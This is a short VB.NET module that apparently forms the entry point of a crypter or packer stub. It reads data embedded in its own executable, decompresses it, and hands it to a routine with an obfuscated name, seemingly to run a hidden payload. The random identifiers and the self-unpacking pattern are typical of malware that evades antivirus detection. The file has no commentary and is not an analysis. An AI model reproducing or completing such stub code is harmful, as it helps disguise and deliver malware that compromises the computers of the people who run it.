﻿Module Module4
    Sub main()
        Dim eBytes() As Byte
        Dim dbytes() As Byte
        eBytes = giWtBCpfkmnh(Application.ExecutablePath)
        dbytes = Compression.Decompress(eBytes)
        zSREwdsMcjpvUxuJKvGTDEYxnCpfMhF(dbytes, Application.ExecutablePath)

    End Sub
End Module

